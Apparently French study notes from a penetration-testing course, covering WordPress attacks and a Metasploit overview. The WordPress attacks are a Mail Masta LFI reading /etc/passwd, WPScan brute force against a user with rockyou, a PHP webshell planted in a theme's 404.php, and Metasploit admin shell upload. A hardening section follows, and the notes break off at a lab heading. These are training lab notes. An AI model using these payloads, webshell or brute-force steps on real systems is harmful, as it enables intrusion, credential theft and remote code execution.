 | Latest Version: X.Y.Z (maybe out of date)
 | Installed Version: X.Y.Z
 | [!] Vulnerabilities identified:
 |   ...

</code></pre></div>
<p>La <strong>“Installed Version”</strong> (ou la version affichée pour ce plugin) est la réponse à soumettre.</p>
<p>Pour ne voir que ce plugin :</p>
<div class="codehilite">
<pre><span></span><code>wpscan<span class="w"> </span>--url<span class="w"> </span>http://TARGET<span class="w"> </span>--enumerate<span class="w"> </span>ap<span class="w"> </span>--api-token<span class="w"> </span>YOUR_API_TOKEN<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>-A<span class="w"> </span><span class="m">5</span><span class="w"> </span><span class="s1">'photo-gallery'</span>
</code></pre>
</div>
<h2>Récap rapide / modèle mental</h2>
<ul>
<li><strong>Directory indexing</strong> : Navigue ou utilise <code>curl</code> sur les répertoires WordPress clés. Si l’indexation est activée, explore l’arborescence jusqu’à trouver <code>flag.txt</code>.</li>
<li><strong>Énumération d’utilisateurs</strong> :
<ul>
<li>Méthode ancienne : <code>/?author=1</code>, <code>/?author=2</code>, etc.</li>
<li>Méthode moderne : <code>curl http://TARGET/wp-json/wp/v2/users | jq</code> et regarde <code>id</code> / <code>name</code>.</li>
</ul></li>
<li><strong>XML-RPC</strong> :
<ul>
<li><code>xmlrpc.php</code> est une feature, mais souvent abusée.</li>
<li><code>system.listMethods</code> liste toutes les méthodes → tu les comptes.</li>
<li><code>system.multicall</code> permet d’enchaîner plusieurs appels en une seule requête.</li>
</ul></li>
<li><strong>WPScan</strong> :
<ul>
<li>Utilise <code>-enumerate</code> avec les bons switches (<code>ap</code>, <code>vp</code>, <code>u</code>, etc.) selon ton objectif.</li>
<li>Pour la version d’un plugin vulnérable, cherche son bloc dans la sortie et lis la version installée.</li>
</ul></li>
</ul>
<h3>Contexte</h3>
<p>WPScan t’a indiqué un plugin vulnérable :</p>
<ul>
<li><strong>Mail Masta 1.0</strong></li>
<li>Vulnérable à <strong>LFI</strong> (Local File Inclusion) et <strong>SQLi</strong></li>
<li><p>PoC LFI :</p>
<p><code>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</code></p></li>
</ul>
<p>L’objectif de la question :</p>
<blockquote>
<p>Utiliser cette vulnérabilité LFI sur ta cible pour lire /etc/passwd, puis trouver l’unique utilisateur non-root ayant un shell de login.</p>
</blockquote>
<h3>Étapes</h3>
<p>Teste la LFI sur ta cible :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span><span class="s2">"http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"</span>
</code></pre>
</div>
<p>Si c’est vulnérable, tu devrais voir un contenu ressemblant à :</p>
<div class="codehilite"><pre><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
wp-user:x:1000:1000:...,/home/wp-user:/bin/bash

</code></pre></div>
<p>Comprendre ce que tu cherches :</p>
<ul>
<li>Un <strong>user non-root</strong></li>
<li>Avec un <strong>vrai shell de login</strong>, typiquement <code>/bin/bash</code> ou <code>/bin/sh</code></li>
<li>Et <strong>le seul</strong> dans ce cas</li>
</ul>
<p>Tu peux filtrer proprement en local si tu veux :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">"http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">"(/bin/bash|/bin/sh)"</span>
</code></pre>
</div>
<ul>
<li>Ignore la ligne <code>root:...:/bin/bash</code></li>
<li>Il ne devrait rester <strong>qu’un</strong> autre utilisateur (ex: <code>wp-user</code>)</li>
</ul>
<p>👉 <strong>Le nom de cet utilisateur</strong> est la réponse à soumettre.</p>
<h2>Attaque par bruteforce sur l’utilisateur <code>roger</code></h2>
<p><em>(Page 12 – WPScan password attack avec rockyou)</em></p>
<p>La question :</p>
<blockquote>
<p>Lancer une attaque de bruteforce contre l’utilisateur roger avec le wordlist rockyou.txt et soumettre le mot de passe trouvé.</p>
</blockquote>
<h3>Pré-requis</h3>
<ul>
<li>Avoir <strong>enumeré les utilisateurs</strong> auparavant (WPScan ou <code>/wp-json/wp/v2/users</code>)</li>
<li><p>Avoir le fichier <code>rockyou.txt</code>, typiquement ici :</p>
<p><code>/usr/share/wordlists/rockyou.txt</code> (pense à le décompresser si besoin : <code>gunzip</code>)</p></li>
</ul>
<h3>Commande WPScan</h3>
<p>On utilise la méthode <code>xmlrpc</code> (plus rapide) :</p>
<div class="codehilite">
<pre><span></span><code>wpscan<span class="w"> </span>--url<span class="w"> </span>http://TARGET<span class="w"> </span><span class="se">\</span>
<span class="w">       </span>--password-attack<span class="w"> </span>xmlrpc<span class="w"> </span><span class="se">\</span>
<span class="w">       </span>-U<span class="w"> </span>roger<span class="w"> </span><span class="se">\</span>
<span class="w">       </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span><span class="se">\</span>
<span class="w">       </span>-t<span class="w"> </span><span class="m">20</span>
</code></pre>
</div>
<ul>
<li><code>-password-attack xmlrpc</code> : attaque via <code>xmlrpc.php</code></li>
<li><code>U roger</code> : utilisateur ciblé</li>
<li><code>P</code> : wordlist</li>
<li><code>t 20</code> : 20 threads</li>
</ul>
<h3>Lecture du résultat</h3>
<p>WPScan va afficher quelque chose du genre :</p>
<div class="codehilite"><pre><code>[+] Performing password attack on Xmlrpc against 1 user/s

[SUCCESS] - roger / MotDePasseTrouvé
...
[i] Valid Combinations Found:
 | Username: roger, Password: MotDePasseTrouvé

</code></pre></div>
<h2>RCE via l’éditeur de thème (Theme Editor – Webshell)</h2>
<p><em>(Page 13 – RCE + flag dans /home/wp-user/flag.txt)</em></p>
<p>La question :</p>
<blockquote>
<p>Utiliser les identifiants admin [admin:sunshine1], uploader un webshell et récupérer le contenu de flag.txt dans le home de wp-user.</p>
</blockquote>
<h3>Étape 1 – Connexion à WordPress</h3>
<p>Va sur la page de login :</p>
<ul>
<li><p><code>http://TARGET/wp-login.php</code></p>
<p>ou</p></li>
<li><p><code>http://TARGET/wp-admin/</code></p></li>
</ul>
<p>Connecte-toi avec :</p>
<ul>
<li><strong>Username</strong> : <code>admin</code></li>
<li><strong>Password</strong> : <code>sunshine1</code></li>
</ul>
<p>Tu arrives sur le <strong>dashboard /wp-admin</strong>.</p>
<h3>Étape 2 – Ouverture de l’éditeur de thème</h3>
<p>Dans le menu de gauche :</p>
<p><strong>Appearance → Theme Editor</strong> (<em>Apparence → Éditeur de thème</em>)</p>
<p>Identifie :</p>
<ul>
<li>Le <strong>thème actif</strong> (à éviter de casser)</li>
<li>Un <strong>thème inactif</strong> (ex : <code>Twenty Seventeen</code>, <code>Twenty Twenty</code>, etc.) – c’est lui qu’on va modifier</li>
</ul>
<p>En haut à droite, choisis un thème inactif dans le menu déroulant, puis clique sur <strong>Select</strong>.</p>
<h3>Étape 3 – Injection d’un webshell dans 404.php</h3>
<ol>
<li>Dans la liste de fichiers du thème (à droite), clique sur <strong>404.php</strong>.</li>
<li>Ajoute une ligne de webshell au tout début du fichier, par exemple :</li>
</ol>
<div class="codehilite">
<pre><span></span><code><span class="cp">&lt;?php</span>
<span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
<span class="o">/**</span>
 <span class="o">*</span> <span class="nx">The</span> <span class="nx">template</span> <span class="k">for</span> <span class="nx">displaying</span> <span class="mi">404</span> <span class="nx">pages</span> <span class="p">(</span><span class="k">not</span> <span class="nx">found</span><span class="p">)</span>
 <span class="o">*</span> <span class="o">...</span>
</code></pre>
</div>
<p>Clique sur <strong>Update File</strong> / <strong>Mettre à jour le fichier</strong>.</p>
<h3>Étape 4 – Tester la RCE</h3>
<p>Appelle ton shell avec un paramètre <code>cmd</code> :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span><span class="s2">"http://TARGET/wp-content/themes/twentyseventeen/404.php?cmd=id"</span>
</code></pre>
</div>
<p>Tu dois voir un output du style :</p>
<div class="codehilite"><pre><code>uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)

</code></pre></div>
<h3>Étape 5 – Récupérer le flag dans le home de <code>wp-user</code></h3>
<p>On va utiliser le même <code>cmd</code> pour parcourir le système :</p>
<ol>
<li>Lister les home directories :</li>
</ol>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span><span class="s2">"http://TARGET/wp-content/themes/twentyseventeen/404.php?cmd=ls%20/home"</span>
</code></pre>
</div>
<p>Tu devrais voir <code>wp-user</code>.</p>
<ol>
<li>Lister le contenu du home de <code>wp-user</code> :</li>
</ol>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span><span class="s2">"http://TARGET/wp-content/themes/twentyseventeen/404.php?cmd=ls%20/home/wp-user"</span>
</code></pre>
</div>
<ol>
<li>Une fois que tu vois <code>flag.txt</code>, lis-le :</li>
</ol>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span><span class="s2">"http://TARGET/wp-content/themes/twentyseventeen/404.php?cmd=cat%20/home/wp-user/flag.txt"</span>
</code></pre>
</div>
<h2>Exploitation automatique avec Metasploit</h2>
<p><em>(Page 14 – <code>wp_admin_shell_upload</code>)</em></p>
<p>Pas forcément une question directe ici, mais très utile pour la suite ou un Skills Assessment.</p>
<h3>Objectif</h3>
<p>Utiliser le module MSF :</p>
<ul>
<li><code>exploit/unix/webapp/wp_admin_shell_upload</code></li>
</ul>
<p>pour :</p>
<ul>
<li>se connecter avec un compte WordPress admin</li>
<li>uploader un shell</li>
<li>obtenir une <strong>session Meterpreter</strong> (ou shell)</li>
</ul>
<h3>Étapes</h3>
<p>Lancer Metasploit :</p>
<div class="codehilite">
<pre><span></span><code>msfconsole
</code></pre>
</div>
<p>Chercher le module :</p>
<div class="codehilite"><pre><code>msf6 &gt; search wp_admin

</code></pre></div>
<p>Utiliser le module :</p>
<div class="codehilite"><pre><code>msf6 &gt; use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt;

</code></pre></div>
<p>Afficher les options :</p>
<div class="codehilite"><pre><code>msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; options

</code></pre></div>
<p>Configurer les paramètres essentiels :</p>
<div class="codehilite"><pre><code>set RHOSTS TARGET
set TARGETURI /
set USERNAME admin
set PASSWORD sunshine1        # ou autre si tes creds sont différents
set LHOST 10.10.x.x           # ton IP VPN HTB
set RPORT 80                  # ou 443 si HTTPS

</code></pre></div>
<p>Lancer l’exploit :</p>
<div class="codehilite"><pre><code>run

</code></pre></div>
<p>Si tout se passe bien, tu obtiens :</p>
<div class="codehilite"><pre><code>[*] Meterpreter session 1 opened ...
meterpreter &gt; getuid
Server username: www-data (33)

</code></pre></div>
<h2>Hardening WordPress (Durcissement)</h2>
<p><em>(Page 15 – bonnes pratiques)</em></p>
<p>Cette partie est plutôt théorique, mais importante pour ton rapport / pour comprendre comment se défendre contre ce que tu viens d’exploiter.</p>
<h3>Mises à jour</h3>
<ul>
<li>Toujours mettre à jour :
<ul>
<li><strong>WordPress core</strong></li>
<li><strong>Plugins</strong></li>
<li><strong>Thèmes</strong></li>
</ul></li>
<li>Possibilité d’activer les <strong>mises à jour automatiques</strong> dans <code>wp-config.php</code> :</li>
</ul>
<div class="codehilite">
<pre><span></span><code><span class="x">define( 'WP_AUTO_UPDATE_CORE', true );</span>
<span class="x">add_filter( 'auto_update_plugin', '__return_true' );</span>
<span class="x">add_filter( 'auto_update_theme', '__return_true' );</span>
</code></pre>
</div>
<h3>Gestion des plugins &amp; thèmes</h3>
<ul>
<li>Installer uniquement des plugins/thèmes <strong>de confiance</strong> (WordPress.org)</li>
<li>Vérifier :
<ul>
<li>les <strong>avis</strong></li>
<li>le <strong>nombre d’installations</strong></li>
<li>la <strong>date de dernière mise à jour</strong></li>
</ul></li>
<li>Supprimer les plugins/thèmes inutilisés (pas juste désactiver → vulnérables mais oubliés)</li>
</ul>
<h3>Plugins de sécurité</h3>
<p>Exemples :</p>
<ul>
<li><strong>Sucuri Security</strong></li>
<li><strong>iThemes Security</strong></li>
<li><strong>Wordfence Security</strong></li>
</ul>
<p>Fonctionnalités utiles :</p>
<ul>
<li>WAF (Web Application Firewall)</li>
<li>Scan malware</li>
<li>Limitation des tentatives de login</li>
<li>Journaux d’activités</li>
<li>Renforcement des mots de passe</li>
</ul>
<h3>Gestion des utilisateurs</h3>
<ul>
<li>Éviter le user <code>admin</code> classique</li>
<li>Imposer des <strong>mots de passe forts</strong></li>
<li>Activer et forcer la <strong>2FA</strong></li>
<li>Appliquer le <strong>principe du moindre privilège</strong></li>
<li>Auditer régulièrement les comptes et supprimer les comptes inutiles</li>
</ul>
<h3>Configuration</h3>
<ul>
<li>Empêcher l’énumération des utilisateurs</li>
<li>Limiter les tentatives de connexion</li>
<li>Restreindre / renommer <code>wp-login.php</code></li>
<li>Désactiver <code>xmlrpc.php</code> si non nécessaire</li>
<li>Désactiver l’indexation de répertoire côté Apache</li>
</ul>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Using the Metasploit Framework</strong></summary><div class="indented"><p><figure class="image"><a href="image%201.png"><img alt="image.png" src="image%201.png"/></a></figure></p>
<h2>Préface &amp; philosophie des outils</h2>
<p>Le module commence par une réflexion sur l’usage des outils automatisés (comme Metasploit) :</p>
<ul>
<li><strong>Arguments “anti-outils” :</strong>
<ul>
<li>Ça ne “prouve” pas les compétences du pentester.</li>
<li>Ça rend le travail “trop facile”.</li>
<li>Ça crée une <strong>zone de confort</strong> et un <strong>tunnel vision</strong> : “si l’outil ne le fait pas, je ne peux pas le faire”.</li>
</ul></li>
<li><strong>Arguments “pro-outils” :</strong>
<ul>
<li>Ils font gagner du temps sur les tâches répétitives.</li>
<li>Ils sont pédagogiques (tu vois concrètement comment une vulnérabilité s’exploite).</li>
<li>Ils libèrent du temps pour les parties plus créatives/difficiles d’un audit.</li>
</ul></li>
<li><strong>Idées importantes :</strong>
<ul>
<li>Tu dois <strong>connaître tes outils</strong> (options, comportements, traces laissées).</li>
<li>Ne pas faire reposer <strong>tout</strong> ton pentest sur Metasploit.</li>
<li>Le but est d’<strong>impressionner toi-même</strong>, pas la commu infosec.</li>
<li>Toujours viser une meilleure compréhension des mécanismes de sécurité derrière les exploits.</li>
</ul></li>
</ul>
<h2>Introduction à Metasploit</h2>
<h3>Metasploit Project &amp; Framework</h3>
<ul>
<li>Metasploit est une <strong>plateforme modulaire</strong> en Ruby, pour :
<ul>
<li>Développer, tester et exécuter des exploits.</li>
<li>Gérer des payloads, du post-exploitation, de l’évasion, etc.</li>
</ul></li>
<li>Deux “branches” principales :
<ul>
<li><strong>Metasploit Framework</strong>
<ul>
<li>Open source, gratuit, CLI.</li>
</ul></li>
<li><strong>Metasploit Pro</strong>
<ul>
<li>Version commerciale, GUI, orientée entreprise, avec :
<ul>
<li>Task chains, social engineering, reporting, intégration Nexpose, etc.</li>
</ul></li>
</ul></li>
</ul></li>
</ul>
<p><strong>Question du module :</strong></p>
<ul>
<li><em>Quelle version de Metasploit possède une interface GUI ?</em> → <strong>Metasploit Pro</strong></li>
<li><em>Quel est le binaire pour la version gratuite ?</em> → <strong><code>msfconsole</code></strong></li>
</ul>
<h3>Arborescence importante</h3>
<p>Sous un ParrotOS/Kali typique : <code>/usr/share/metasploit-framework</code></p>
<ul>
<li><code>data</code>, <code>lib</code>, <code>documentation</code> : cœur du framework + docs.</li>
<li><code>modules/</code> :
<ul>
<li><code>auxiliary</code>, <code>exploits</code>, <code>payloads</code>, <code>post</code>, etc.</li>
</ul></li>
<li><code>plugins/</code> :
<ul>
<li>scripts Ruby pour intégrer Nessus, Nexpose, sqlmap, etc.</li>
</ul></li>
<li><code>scripts/</code> :
<ul>
<li><code>meterpreter/</code>, <code>resource/</code>, etc.</li>
</ul></li>
<li><code>tools/</code> :
<ul>
<li>utilitaires en ligne de commande (recon, password, exploit, etc.).</li>
</ul></li>
</ul>
<h2>msfconsole &amp; structure d’un engagement MSF</h2>
<h3>Lancer msfconsole</h3>
<div class="codehilite">
<pre><span></span><code>msfconsole
msfconsole<span class="w"> </span>-q<span class="w">   </span><span class="c1"># sans le gros banner ASCII</span>
</code></pre>
</div>
<p>Metasploit s’occupe maintenant de ses mises à jour via <code>apt</code> :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>apt<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>metasploit-framework
</code></pre>
</div>
<h3>Structure d’un engagement avec MSF</h3>
<p>Le module découpe un engagement typique en 5 grandes phases :</p>
<p><strong>Enumeration</strong></p>
<ul>
<li>Découvrir les services, versions, OS.</li>
<li>Exemple : <code>nmap -sV &lt;IP&gt;</code> ou <code>db_nmap</code> (dans msfconsole).</li>
</ul>
<p><strong>Preparation</strong></p>
<ul>
<li>Recherche de vulnérabilités, mapping service/version ↔ CVE ↔ module MSF.</li>
<li>Éventuel audit de code.</li>
</ul>
<p><strong>Exploitation</strong></p>
<ul>
<li>Choisir et configurer un module <code>exploit/</code>.</li>
<li>Lancer l’exploitation et obtenir un shell/session.</li>
</ul>
<p><strong>Privilege Escalation</strong></p>
<ul>
<li>Élever les privilèges jusqu’à admin/System/root.</li>
</ul>
<p><strong>Post-Exploitation</strong></p>
<ul>
<li>Pivot, exfiltration, persistance, récolte de credentials, etc.</li>
</ul>
<p>Metasploit fournit des briques pour chacune de ces étapes (scanners, exploits, payloads, post modules, etc.).</p>
<h2>Modules : structure &amp; recherche</h2>
<h3>Format d’un module</h3>
<p>Dans les résultats de recherche MSF :</p>
<div class="codehilite"><pre><code>&lt;index&gt; &lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;

</code></pre></div>
<p>Exemple :</p>
<div class="codehilite"><pre><code>794 exploit/windows/ftp/scriptftp_list

</code></pre></div>
<ul>
<li><strong>index</strong> → chiffre utilisé avec <code>use &lt;index&gt;</code></li>
<li><strong>type</strong> → <code>exploit</code>, <code>auxiliary</code>, <code>post</code>, <code>payload</code>, <code>encoder</code>, <code>nop</code>, <code>evasion</code>, <code>plugin</code></li>
<li><strong>os</strong> → <code>windows</code>, <code>linux</code>, <code>android</code>, etc.</li>
<li><strong>service</strong> → service ou catégorie (<code>smb</code>, <code>http</code>, <code>gather</code>, …)</li>
<li><strong>name</strong> → nom précis du module</li>
</ul>
<p><strong>Modules interactifs</strong> (ceux que tu peux <code>use</code>) :</p>
<ul>
<li><code>auxiliary</code>, <code>exploit</code>, <code>post</code></li>
</ul>
<h3>Recherche de modules (<code>search</code>)</h3>
<div class="codehilite"><pre><code>search [options] [keywords]

</code></pre></div>
<p>Tu peux filtrer par :</p>
<ul>
<li><code>type:exploit</code></li>
<li><code>platform:windows</code></li>
<li><code>cve:2021</code></li>
<li><code>rank:excellent</code></li>
<li><code>name:...</code>, <code>description:...</code></li>
<li>etc.</li>
</ul>
<p>Exemples vus dans le cours :</p>
<div class="codehilite"><pre><code>search eternalromance
search ms17_010
search type:exploit platform:windows cve:2021 rank:excellent microsoft

</code></pre></div>
<h3>Sélection &amp; configuration d’un module</h3>
<p><strong>Choisir un module via son index</strong> :</p>
<div class="codehilite"><pre><code>use 0

</code></pre></div>
<p><strong>Voir les options</strong> :</p>
<div class="codehilite"><pre><code>show options

</code></pre></div>
<p><strong>Paramétrer la cible &amp; l’attaque</strong> :</p>
<ul>
<li><code>RHOSTS</code> : IP(s) de la cible</li>
<li><code>RPORT</code> : port cible (souvent par défaut correct)</li>
<li><code>LHOST</code> : ton IP (tun0 sur HTB par ex.)</li>
<li><code>LPORT</code> : port d’écoute (par défaut 4444, modifiable)</li>
</ul>
<div class="codehilite"><pre><code>set RHOSTS 10.10.x.x
set LHOST 10.10.y.y

</code></pre></div>
<p><strong>Variables globales</strong> (<code>setg</code>) :</p>
<ul>
<li>Conserve la valeur pour tous les modules tant que msfconsole est ouvert.</li>
</ul>
<div class="codehilite"><pre><code>setg RHOSTS 10.10.x.x
setg LHOST 10.10.y.y

</code></pre></div>
<p><strong>Info détaillée du module</strong> :</p>
<div class="codehilite"><pre><code>info

</code></pre></div>
<p><strong>Lancer l’exploit</strong> :</p>
<div class="codehilite"><pre><code>run
# ou
exploit

</code></pre></div>
<h2>Targets (cibles MSF)</h2>
<p>Chaque exploit peut supporter plusieurs “targets” (combos OS/version/service pack/langue, etc.).</p>
<ul>
<li><p>Dans un exploit :</p>
<div class="codehilite"><pre><code>show targets

</code></pre></div></li>
<li><p>Tu vois par exemple :</p>
<div class="codehilite"><pre><code>0 Automatic
1 IE 7 on Windows XP SP3
2 IE 8 on Windows XP SP3
...
6 IE 9 on Windows 7

</code></pre></div></li>
<li><p><strong>Mode automatique</strong> : <code>target 0</code> → le module tente de détecter la bonne cible.</p></li>
<li><strong>Mode manuel</strong> : si tu connais l’OS/version, tu peux fixer :
<div class="codehilite"><pre><code>set target 6

</code></pre></div></li>
</ul>
<p>Dans la pratique, pour beaucoup de modules récents, le mode <code>Automatic</code> suffit.</p>
<h2>Payloads</h2>
<h3>Types de payloads</h3>
<p>Un payload est ce qui est exécuté <strong>après</strong> (ou pendant) l’exploitation pour te donner un accès ou exécuter quelque chose sur la cible.</p>
<p>Trois catégories :</p>
<p><strong>Singles</strong></p>
<ul>
<li>Payloads “monolithiques”.</li>
<li>Tout est contenu dans un seul blob (exploit + action).</li>
<li>Taille plus grande, mais simples.</li>
</ul>
<p><strong>Stagers</strong></p>
<ul>
<li>Petits payloads dont le but principal est de mettre en place un <strong>canal de communication</strong> (reverse TCP, bind TCP, HTTP, etc.).</li>
<li>Ils téléchargent ensuite un “stage” plus gros.</li>
</ul>
<p><strong>Stages</strong></p>
<ul>
<li>Code “complet” téléchargé par le stager (ex : Meterpreter, VNC, etc.).</li>
<li>Pas de limite de taille pratique.</li>
</ul>
<p>Nom de payload :</p>
<ul>
<li><strong>single</strong> : <code>windows/shell_reverse_tcp</code></li>
<li><strong>staged</strong> : <code>windows/shell/reverse_tcp</code> (note le <code>/</code> qui sépare stager/stage)</li>
</ul>
<h3>Meterpreter</h3>
<p>Payload star de Metasploit :</p>
<ul>
<li>S’exécute en mémoire (pas d’écritures sur disque).</li>
<li>Très modulable (extensions, scripts, plugins).</li>
<li>Offre des commandes pour :
<ul>
<li>Fichiers (<code>ls</code>, <code>cd</code>, <code>download</code>, <code>upload</code>, <code>search</code>, …)</li>
<li>Réseau (<code>ifconfig</code>, <code>netstat</code>, <code>portfwd</code>, <code>route</code>, …)</li>
<li>Système (<code>ps</code>, <code>getuid</code>, <code>hashdump</code>, <code>sysinfo</code>, <code>shell</code>, <code>migrate</code>, …)</li>
<li>UI (<code>screenshot</code>, <code>screenshare</code>, keylogger, webcam, etc.).</li>
<li>Privilege escalation (<code>getsystem</code>, <code>steal_token</code>, …)</li>
</ul></li>
</ul>
<p>Tu passes ensuite en shell Windows si tu veux :</p>
<div class="codehilite"><pre><code>meterpreter &gt; shell

</code></pre></div>
<h3>Choisir un payload</h3>
<p>Dans un exploit :</p>
<div class="codehilite"><pre><code>show payloads

</code></pre></div>
<p>Pour filtrer :</p>
<div class="codehilite"><pre><code>grep meterpreter show payloads
grep meterpreter grep reverse_tcp show payloads

</code></pre></div>
<p>Puis :</p>
<div class="codehilite"><pre><code>set payload windows/x64/meterpreter/reverse_tcp
# ou via l’index
set payload 15

</code></pre></div>
<p>Le <code>show options</code> va alors afficher :</p>
<ul>
<li>les options de l’exploit (RHOSTS, RPORT, etc.)</li>
<li>les options du payload (LHOST, LPORT, EXITFUNC, …)</li>
</ul>
<h2>Encoders</h2>
<h3>Rôle</h3>
<p>Les encoders servent à :</p>
<ul>
<li>Adapter les payloads à certaines contraintes (architecture, bad chars, etc.).</li>
<li>Historiquement, aider à contourner les signatures AV/IDS.</li>
<li>Aujourd’hui, <strong>beaucoup moins efficaces</strong> pour l’évasion AV (les moteurs ont rattrapé leur retard).</li>
</ul>
<p>Architectures supportées : <code>x86</code>, <code>x64</code>, <code>sparc</code>, <code>ppc</code>, <code>mips</code>, …</p>
<p>Exemple célèbre : <strong>Shikata Ga Nai</strong></p>
<p>→ encoder polymorphique XOR, très utilisé pendant longtemps, désormais largement détecté.</p>
<h3>Encoders dans msfconsole</h3>
<p>Dans un exploit + payload :</p>
<div class="codehilite"><pre><code>show encoders

</code></pre></div>
<p>Tu vois la liste des encoders compatibles (<code>x86/shikata_ga_nai</code>, <code>x64/xor</code>, etc.) avec un “rank”.</p>
<h3>Encodage avec msfvenom</h3>
<p>Ancien combo : <code>msfpayload</code> + <code>msfencode</code> → remplacé par <code>msfvenom</code>.</p>
<p>Exemple :</p>
<div class="codehilite">
<pre><span></span><code><span class="c1"># payload + encodage shikata_ga_nai</span>
msfvenom<span class="w"> </span>-a<span class="w"> </span>x86<span class="w"> </span>--platform<span class="w"> </span>windows<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>...<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>...<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>payload.exe
</code></pre>
</div>
<p>Tu peux faire plusieurs itérations :</p>
<div class="codehilite">
<pre><span></span><code>msfvenom<span class="w"> </span>...<span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span><span class="w"> </span>...
</code></pre>
</div>
<p>Le module montre bien que, même avec SGN + plusieurs itérations, <strong>les AV modernes détectent toujours massivement</strong> ce genre de payload.</p>
<h2>Base de données Metasploit (PostgreSQL)</h2>
<h3>Initialisation</h3>
<p>Sur la machine :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>systemctl<span class="w"> </span>start<span class="w"> </span>postgresql<span class="w">   </span><span class="c1"># ou service postgresql start</span>
sudo<span class="w"> </span>msfdb<span class="w"> </span>init
sudo<span class="w"> </span>msfdb<span class="w"> </span>run<span class="w">    </span><span class="c1"># lance msfconsole connecté à la DB</span>
</code></pre>
</div>
<p>Dans <code>msfconsole</code> :</p>
<div class="codehilite"><pre><code>db_status
[*] Connected to msf. Connection type: postgresql.

</code></pre></div>
<h3>Commandes DB utiles</h3>
<div class="codehilite"><pre><code>help database

</code></pre></div>
<p>Principales :</p>
<ul>
<li><code>db_import</code> : importe un fichier de résultats (Nmap, Nessus, etc.).</li>
<li><code>db_export</code> : exporte ton workspace (xml, pwdump).</li>
<li><code>db_nmap</code> : lance Nmap depuis msfconsole et stocke direct le résultat.</li>
<li><code>hosts</code> : liste les hôtes connus par la DB.</li>
<li><code>services</code> : liste les services découverts.</li>
<li><code>vulns</code> : vulnérabilités connues.</li>
<li><code>loot</code> : fichiers/artefacts récupérés.</li>
<li><code>creds</code> : credentials récoltés.</li>
<li><code>workspace</code> : gestion multi-projets.</li>
</ul>
<h3>Workspaces</h3>
<p>Comme des dossiers de projet :</p>
<div class="codehilite"><pre><code>workspace           # liste
workspace -a WebApp # ajoute un workspace
workspace WebApp    # switch
workspace -d Old    # supprime

</code></pre></div>
<h3>Importer &amp; scanner</h3>
<ul>
<li><p>Import Nmap XML :</p>
<div class="codehilite"><pre><code>db_import scan.xml
hosts
services

</code></pre></div></li>
<li><p>Lancer Nmap depuis MSF :</p>
<div class="codehilite"><pre><code>db_nmap -sV -sS 10.10.x.x

</code></pre></div></li>
<li><p>Export de sauvegarde :</p>
<div class="codehilite"><pre><code>db_export -f xml backup.xml

</code></pre></div></li>
</ul>
<h2>Plugins &amp; Mixins</h2>
<h3>Plugins</h3>
<ul>
<li><p>Fichiers Ruby dans :</p>
<div class="codehilite">
<pre><span></span><code>/usr/share/metasploit-framework/plugins/
</code></pre>
</div></li>
<li><p>Liste (exemples) :</p>
<ul>
<li><code>nessus.rb</code>, <code>nexpose.rb</code>, <code>openvas.rb</code>, <code>sqlmap.rb</code>, <code>wmap.rb</code>, etc.</li>
</ul></li>
<li>Chargement dans msfconsole :
<div class="codehilite"><pre><code>load nessus
nessus_help

</code></pre></div></li>
</ul>
<p>Plugins typiques :</p>
<ul>
<li>Intégration de scanners (Nessus, Nexpose, OpenVAS).</li>
<li>Automation (DarkOperator’s pentest plugin).</li>
<li>Intégration wiki, RSS, agrégation, etc.</li>
</ul>
<p><strong>Installation d’un nouveau plugin :</strong></p>
<ul>
<li>Cloner le repo (ex : DarkOperator).</li>
<li>Copier le <code>.rb</code> dans le dossier <code>plugins/</code>.</li>
<li>Relancer <code>msfconsole</code> puis <code>load &lt;plugin&gt;</code>.</li>
</ul>
<h3>Mixins (côté dev)</h3>
<ul>
<li>Concept Ruby : inclusion de modules dans des classes (<code>include</code>).</li>
<li>Permet de factoriser le code (HTTP client, SMB, etc.) dans des modules réutilisables.</li>
<li>Important si tu écris tes propres modules, moins si tu ne fais “que” les utiliser.</li>
</ul>
<h2>Labs / Flags du module</h2>
<h3>Lab 1 – EternalRomance (MS17-010, SMB)</h3>
